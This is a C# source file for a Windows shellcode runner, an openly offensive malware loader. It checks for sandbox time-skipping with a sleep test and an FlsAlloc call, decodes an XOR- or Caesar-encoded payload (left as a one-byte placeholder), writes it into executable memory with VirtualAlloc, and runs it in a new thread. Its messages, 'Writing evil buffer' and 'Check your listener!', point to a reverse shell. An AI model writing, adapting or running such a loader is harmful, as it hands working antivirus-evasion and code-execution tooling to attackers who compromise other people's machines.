using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Diagnostics;
using System.Runtime.InteropServices;

namespace CSharpShellcodeRunner
{
    class Program
    {
        [DllImport("kernel32.dll")]
        static extern void Sleep(uint dwMilliseconds);

        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

        [DllImport("kernel32.dll")]
        static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, 
            uint dwCreationFlags, IntPtr lpThreadId);

        [DllImport("kernel32.dll")]
        static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32
        dwMilliseconds);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern IntPtr FlsAlloc(IntPtr callback);
        static void Main(string[] args)
        {
            DateTime stime = DateTime.Now;
            Sleep(4000);
            double etime = DateTime.Now.Subtract(stime).TotalSeconds;
            if (etime < 3.5)
            {
                return;
            }

            IntPtr call = FlsAlloc(IntPtr.Zero);
            if (call == null)
            {
                return;
            }

            // insert xor-encoded shellcode here
            byte[] buf = new byte[1] { 0x3c };
            
            Console.WriteLine("[+] Decrypting shellcode!");
            // uncomment the appropriate decryption mechanism based on shellcode encryption

            // caesar decode
            /*
            for(int i = 0; i < buf.Length; i++)
            {
                buf[i] = (byte)(((uint)buf[i] - 2) & 0xFF);
            }
            */

            // xor decode with key value 0x3c
            for (int i = 0; i < buf.Length; i++)
            {
                buf[i] = (byte)((uint)buf[i] ^ 0x3c); 
            }

            int size = buf.Length;

            Console.WriteLine("[+] Allocating memory space");
            IntPtr addr = VirtualAlloc(IntPtr.Zero, (uint)size, 0x3000, 0x40);

            Console.WriteLine("[+] Writing evil buffer");
            Marshal.Copy(buf, 0, addr, size);

            Console.WriteLine("[+] Executing shellcode");
            Console.WriteLine("[+] Check your listener!");
            IntPtr hThread = CreateThread(IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);

            WaitForSingleObject(hThread, 0xFFFFFFFF);
        }
    }
}